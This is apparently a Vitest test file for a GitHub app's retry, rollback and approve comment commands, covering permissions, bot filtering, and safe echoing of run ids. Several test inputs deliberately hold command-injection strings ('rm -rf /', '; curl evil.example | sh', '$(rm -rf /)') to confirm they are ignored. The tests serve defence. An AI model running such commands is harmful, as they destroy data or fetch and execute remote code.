import { beforeEach, describe, expect, it, vi } from "vitest";

import { parseComment } from "./commands.js";
import { dispatchGitHubEvent } from "./events.js";
import { createDefaultRemediationHandler } from "./remediation-handler.js";
import { createInMemoryAppStateStore } from "./state.js";
import { DEFAULT_REPO_CONFIG } from "./types.js";

const { remediateFromScanMock } = vi.hoisted(() => ({
  remediateFromScanMock: vi.fn(async (..._args: unknown[]) => ({
    schemaVersion: "1.0",
    status: "ok",
    generatedAt: "2026-01-01T00:00:00.000Z",
    cveIds: ["CVE-2021-23337"],
    reports: [],
    successCount: 0,
    failedCount: 0,
    errors: [],
    patchCount: 0,
  })),
}));
vi.mock("autoremediator", () => ({ remediateFromScan: remediateFromScanMock }));

const RUN = "run_k3j2h1g0f9e8d7c6b5a4";

describe("parseComment: retry, rollback, approve", () => {
  it("parses retry with ids and rollback without", () => {
    expect(parseComment("/autoremediator retry cve-2021-23337 GHSA-35jh-r3h4-6jhm")).toEqual({
      name: "retry",
      advisoryIds: ["CVE-2021-23337", "GHSA-35JH-R3H4-6JHM"],
      ignored: [],
    });
    expect(parseComment("/autoremediator rollback")).toEqual({
      name: "rollback",
      advisoryIds: [],
      ignored: [],
    });
  });

  it("does not treat run ids or extra words as anything but ignored text", () => {
    const parsed = parseComment(`/autoremediator rollback ${RUN}; rm -rf /`);
    expect(parsed?.name).toBe("rollback");
    expect(parsed?.advisoryIds).toEqual([]);
    expect(parsed?.ignored).toEqual([RUN, "rm", "-rf", "/"]);
  });

  it("is case-insensitive about the command word, like the others", () => {
    expect(parseComment("/autoremediator RETRY CVE-2021-23337")?.name).toBe("retry");
  });

  it("has no approve command: the word is unrecognised and answered with help", () => {
    const parsed = parseComment("/autoremediator approve CVE-2021-23337");
    expect(parsed?.name).toBe("help");
    expect(parsed?.ignored).toEqual(["approve"]);
  });

  it("still skips quoted and fenced text for the new commands", () => {
    expect(parseComment("> /autoremediator rollback")).toBeUndefined();
    expect(parseComment("```\n/autoremediator retry CVE-2021-23337\n```")).toBeUndefined();
  });
});

describe("comment events for the new commands", () => {
  const event = (
    body: string,
    user: Record<string, unknown> = { login: "alice", type: "User" },
  ) => ({
    action: "created",
    installation: { id: 1 },
    comment: { body, user },
    issue: { number: 7 },
    repository: { name: "r", owner: { login: "o" } },
  });

  it("triggers for retry and rollback from a person, never from a bot", async () => {
    const onRemediationRequested = vi.fn();
    for (const body of ["/autoremediator retry CVE-2021-23337", "/autoremediator rollback"]) {
      const result = await dispatchGitHubEvent({ eventName: "issue_comment" }, event(body), {
        onRemediationRequested,
      });
      expect(result.status).toBe("handled");
    }
    expect(onRemediationRequested).toHaveBeenCalledTimes(2);

    onRemediationRequested.mockClear();
    for (const user of [
      { login: "autoremediator[bot]", type: "Bot" },
      { login: "dependabot[bot]", type: "User" },
    ]) {
      const result = await dispatchGitHubEvent(
        { eventName: "issue_comment" },
        event("/autoremediator rollback", user),
        {
          onRemediationRequested,
        },
      );
      expect(result.status).toBe("ignored");
    }
    expect(onRemediationRequested).not.toHaveBeenCalled();
  });
});

function setup(
  permission = "write",
  extra: {
    body?: string | null;
    /** Who wrote the pull request (default: the app). */
    author?: string;
    commits?: string[];
    commitAuthor?: string;
    pullRequest?: boolean;
  } = {},
) {
  const comments: string[] = [];
  const octokit = {
    repos: { getCollaboratorPermissionLevel: vi.fn(async () => ({ data: { permission } })) },
    issues: {
      createComment: vi.fn(async ({ body }: { body: string }) => {
        comments.push(body);
        return {};
      }),
      get: vi.fn(async () => ({
        data: { body: extra.body ?? null, user: { login: extra.author ?? "autoremediator[bot]" } },
      })),
    },
    pulls: {
      listCommits: vi.fn(async () => ({
        data: (extra.commits ?? []).map((message) => ({
          commit: { message },
          author: { login: extra.commitAuthor ?? "autoremediator[bot]" },
        })),
      })),
    },
  };
  const stateStore = createInMemoryAppStateStore();
  const handler = createDefaultRemediationHandler({
    octokitFactory: vi.fn(async () => octokit as never),
    repoConfigProvider: vi.fn(async () => ({ ...DEFAULT_REPO_CONFIG, dryRun: false })),
    checkoutProvider: vi.fn(async () => ({ cwd: "/tmp/checkout", cleanup: async () => {} })),
    stateStore,
  });
  const send = (body: string, h = handler) =>
    h({
      eventName: "issue_comment",
      installationId: 1,
      payload: {
        comment: { body, user: { login: "alice", type: "User" } },
        issue: { number: 7, ...(extra.pullRequest === false ? {} : { pull_request: {} }) },
        repository: { name: "r", owner: { login: "o" } },
      },
    });
  return { send, comments, octokit, stateStore, handler };
}

describe("retry", () => {
  beforeEach(() => remediateFromScanMock.mockClear());

  it("runs an advisory again the way it was last run: a fix is a fix", async () => {
    const { send, stateStore } = setup();
    await send("/autoremediator fix CVE-2021-23337");
    expect(stateStore.getRemediationMode("o/r:cve-2021-23337")).toBe("fix");

    remediateFromScanMock.mockClear();
    await send("/autoremediator retry CVE-2021-23337");
    const options = remediateFromScanMock.mock.calls[0]?.[1] as Record<string, unknown>;
    expect(options.dryRun).toBe(false);
    expect(options.changeRequest).toMatchObject({ enabled: true });
  });

  it("a plan is retried as a plan, with no pull request", async () => {
    const { send } = setup();
    await send("/autoremediator plan CVE-2021-23337");
    remediateFromScanMock.mockClear();
    await send("/autoremediator retry CVE-2021-23337");
    const options = remediateFromScanMock.mock.calls[0]?.[1] as Record<string, unknown>;
    expect(options.dryRun).toBe(true);
    expect(options.changeRequest).toBeUndefined();
  });

  it("a fix that failed can be retried, because the request is recorded before it runs", async () => {
    const { send, comments } = setup();
    remediateFromScanMock.mockRejectedValueOnce(new Error("network"));
    await expect(send("/autoremediator fix CVE-2021-23337")).resolves.toMatchObject({ status: "partial" });
    remediateFromScanMock.mockClear();
    await send("/autoremediator retry CVE-2021-23337");
    expect(remediateFromScanMock).toHaveBeenCalledTimes(1);
    expect(comments.some((body) => body.includes("could not finish"))).toBe(true);
  });

  it("refuses to guess when an advisory has no history, and runs nothing", async () => {
    const { send, comments } = setup();
    await send("/autoremediator retry CVE-2021-23337");
    expect(remediateFromScanMock).not.toHaveBeenCalled();
    expect(comments[0]).toContain("Nothing to retry for CVE-2021-23337");
  });

  it("asks for separate retries when the advisories were last run in different modes", async () => {
    const { send, comments } = setup();
    await send("/autoremediator plan CVE-2021-23337");
    await send("/autoremediator fix CVE-2024-0001");
    remediateFromScanMock.mockClear();
    comments.length = 0;
    await send("/autoremediator retry CVE-2021-23337 CVE-2024-0001");
    expect(remediateFromScanMock).not.toHaveBeenCalled();
    expect(comments[0]).toContain("different modes");
  });

  it("needs an id, and needs write access", async () => {
    const withId = setup("read");
    await withId.send("/autoremediator retry CVE-2021-23337");
    expect(remediateFromScanMock).not.toHaveBeenCalled();
    expect(withId.comments[0]).toContain("write access");

    const noId = setup("write");
    await noId.send("/autoremediator retry");
    expect(remediateFromScanMock).not.toHaveBeenCalled();
    expect(noId.comments[0]).toContain("at least one CVE or GHSA id");
  });

  it("has no history, and says so, when the app has no state store", async () => {
    const { octokit } = setup();
    const handler = createDefaultRemediationHandler({
      octokitFactory: vi.fn(async () => octokit as never),
      repoConfigProvider: vi.fn(async () => ({ ...DEFAULT_REPO_CONFIG })),
      checkoutProvider: vi.fn(async () => ({ cwd: "/tmp/checkout", cleanup: async () => {} })),
    });
    const sent = setup();
    await sent.send("/autoremediator retry CVE-2021-23337", handler);
    expect(remediateFromScanMock).not.toHaveBeenCalled();
    expect(octokit.issues.createComment).toHaveBeenCalledWith(
      expect.objectContaining({ body: expect.stringContaining("Nothing to retry") }),
    );
  });

  it("keeps history per repository", async () => {
    const { stateStore } = setup();
    stateStore.recordRemediationMode("o/other:cve-2021-23337", "fix");
    expect(stateStore.getRemediationMode("o/r:cve-2021-23337")).toBeUndefined();
  });
});

describe("rollback", () => {
  beforeEach(() => remediateFromScanMock.mockClear());

  it("replies with the exact command for the run recorded in the pull request body, and does nothing else", async () => {
    const { send, comments, octokit } = setup("write", {
      body: `Fixes lodash.\n\nFixes-CVE: CVE-2021-23337\nAutoremediator-Run: ${RUN}\nVerified-By: autoremediator (install)`,
    });
    await send("/autoremediator rollback");
    expect(comments).toHaveLength(1);
    expect(comments[0]).toContain(`autoremediator runs rollback ${RUN}`);
    expect(comments[0]).toContain("does not roll anything back from a comment");
    expect(remediateFromScanMock).not.toHaveBeenCalled();
    // It read the pull request and wrote one comment; it changed nothing else.
    expect(Object.keys(octokit)).toEqual(["repos", "issues", "pulls"]);
    expect(octokit.issues.createComment).toHaveBeenCalledTimes(1);
  });

  it("falls back to the commit messages of a pull request", async () => {
    const { send, comments } = setup("write", {
      body: "No trailer here",
      commits: ["fix\n\nAutoremediator-Run: run_aaaaaaaaaaaaaaaaaaaa", "other"],
    });
    await send("/autoremediator rollback");
    expect(comments[0]).toContain("autoremediator runs rollback run_aaaaaaaaaaaaaaaaaaaa");
  });

  it("lists several runs, once each", async () => {
    const { send, comments } = setup("write", {
      body: `Autoremediator-Run: ${RUN}\nAutoremediator-Run: ${RUN}\nAutoremediator-Run: run_aaaaaaaaaaaaaaaaaaaa`,
    });
    await send("/autoremediator rollback");
    expect(comments[0]!.match(/runs rollback run_/g)).toHaveLength(2);
  });

  it("only echoes ids in the exact run id format, so a trailer cannot smuggle in a command", async () => {
    const { send, comments } = setup("write", {
      body: [
        "Autoremediator-Run: run_short",
        `Autoremediator-Run: ${RUN}; curl evil.example | sh`,
        "Autoremediator-Run: run_ABCDEFGHIJKLMNOPQRST",
        "Autoremediator-Run: $(rm -rf /)",
        "  text Autoremediator-Run: run_bbbbbbbbbbbbbbbbbbbb",
      ].join("\n"),
    });
    await send("/autoremediator rollback");
    expect(comments[0]).toContain("No `Autoremediator-Run:` trailer was found");
    expect(comments[0]).not.toContain("curl");
    expect(comments[0]).not.toContain("rm -rf");
    expect(comments[0]).not.toContain("runs rollback");
  });

  it("says plainly when there is no recorded run", async () => {
    const { send, comments } = setup("write", { body: "just a description" });
    await send("/autoremediator rollback");
    expect(comments[0]).toContain("no recorded run to roll back");
  });

  it("does not look at commits for a plain issue", async () => {
    const { send, octokit } = setup("write", { body: "x", pullRequest: false });
    await send("/autoremediator rollback");
    expect(octokit.pulls.listCommits).not.toHaveBeenCalled();
  });

  it.each(["mallory", "dependabot[bot]", "renovate[bot]"])(
    "does not echo a run id from a description written by %s",
    async (author) => {
      const { send, comments } = setup("write", { body: `Autoremediator-Run: ${RUN}`, author });
      await send("/autoremediator rollback");
      expect(comments).toHaveLength(1);
      expect(comments[0]).not.toContain(RUN);
      expect(comments[0]).toContain("no recorded run to roll back");
    },
  );

  it("does not echo a run id from commits a person wrote", async () => {
    const { send, comments } = setup("write", {
      body: "No trailer here",
      commits: [`fix\n\nAutoremediator-Run: ${RUN}`],
      commitAuthor: "mallory",
    });
    await send("/autoremediator rollback");
    expect(comments[0]).not.toContain(RUN);
  });

  it("needs write access, and reads nothing for someone without it", async () => {
    const { send, comments, octokit } = setup("read", { body: `Autoremediator-Run: ${RUN}` });
    await send("/autoremediator rollback");
    expect(comments[0]).toContain("write access");
    expect(octokit.issues.get).not.toHaveBeenCalled();
    expect(comments[0]).not.toContain(RUN);
  });

  it("answers someone without write access once per thread, then stays silent", async () => {
    const { send, comments } = setup("read");
    await send("/autoremediator rollback");
    await send("/autoremediator fix CVE-2021-23337");
    await send("/autoremediator plan CVE-2021-23337");
    expect(comments).toHaveLength(1);
    expect(comments[0]).toContain("write access");
    expect(remediateFromScanMock).not.toHaveBeenCalled();
  });

  it("without a state store to remember it in, someone without write access gets no reply", async () => {
    const { octokit, send } = setup("read");
    const bare = createDefaultRemediationHandler({
      octokitFactory: vi.fn(async () => octokit as never),
      repoConfigProvider: vi.fn(async () => ({ ...DEFAULT_REPO_CONFIG })),
    });
    await send("/autoremediator rollback", bare);
    expect(octokit.issues.createComment).not.toHaveBeenCalled();
  });

  it("does not leak an API error", async () => {
    const { send, comments, octokit } = setup("write");
    octokit.issues.get.mockRejectedValueOnce(new Error("token ghs_SECRET rejected"));
    await send("/autoremediator rollback");
    expect(comments[0]).toContain("could not read");
    expect(comments[0]).not.toContain("ghs_SECRET");
  });
});

describe("approve", () => {
  beforeEach(() => remediateFromScanMock.mockClear());

  it("is not a command: it answers with help, runs nothing and approves nothing", async () => {
    const { send, comments, octokit } = setup();
    await send("/autoremediator approve CVE-2021-23337");
    expect(remediateFromScanMock).not.toHaveBeenCalled();
    expect(comments[0]).toContain("/autoremediator plan");
    expect(Object.keys(octokit)).not.toContain("pulls.createReview");
  });
});
